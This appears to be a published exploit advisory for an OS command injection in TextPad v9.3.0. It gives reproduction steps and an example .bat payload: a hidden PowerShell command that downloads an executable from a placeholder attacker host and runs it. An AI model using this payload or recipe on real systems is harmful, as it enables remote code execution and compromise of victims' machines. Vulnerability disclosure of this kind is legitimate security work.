---
layout: post
title: TextPad v9.3.0 - OS Command Injection
date: 2023-09-17
category: exploit
---

# Exploit Title: TextPad v9.3.0 - OS Command Injection
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 17.09.2023
# Vendor Homepage: https://www.textpad.com
# Software Link: https://www.textpad.com/file?path=v9/setupv9.exe
# Tested Version: v9.3.0 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Open TextPad.
2. Create a `.bat` file containing your reverse shell command.
3. In TextPad, go to the **File** menu and click on **Open...**.
4. Select the `.bat` file you created.
5. Click on the **globe icon** (view in web browser).
6. Your reverse shell should now be active, connecting back to your listener.

### Example of Reverse Shell Command in .bat

To set up a reverse shell in a `.bat` file, you can use the following command:

```batch
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://attacker_ip:port -OutFile %TEMP%\shell.exe; Start-Process %TEMP%\shell.exe"
